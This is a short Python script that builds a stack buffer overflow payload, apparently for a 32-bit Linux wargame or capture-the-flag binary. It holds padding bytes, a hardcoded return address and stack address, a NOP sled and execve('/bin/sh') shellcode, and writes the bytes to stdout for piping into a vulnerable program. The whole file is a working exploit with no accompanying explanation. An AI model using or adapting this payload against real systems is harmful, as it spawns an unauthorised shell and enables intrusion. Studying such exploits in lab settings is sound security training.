#!/usr/bin/python3.6
import struct
import sys
# core dump > debugging
ret = struct.pack("I",0x08048508)
OFFSET = 80
buff = b"A" * OFFSET
shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
nop_sled = b"\x90"*40
eip = struct.pack("I",0xbffff0d9) 

payload = buff
payload += ret
payload += eip
payload += nop_sled
payload += shellcode
payload += b"\n"

sys.stdout.buffer.write(payload)
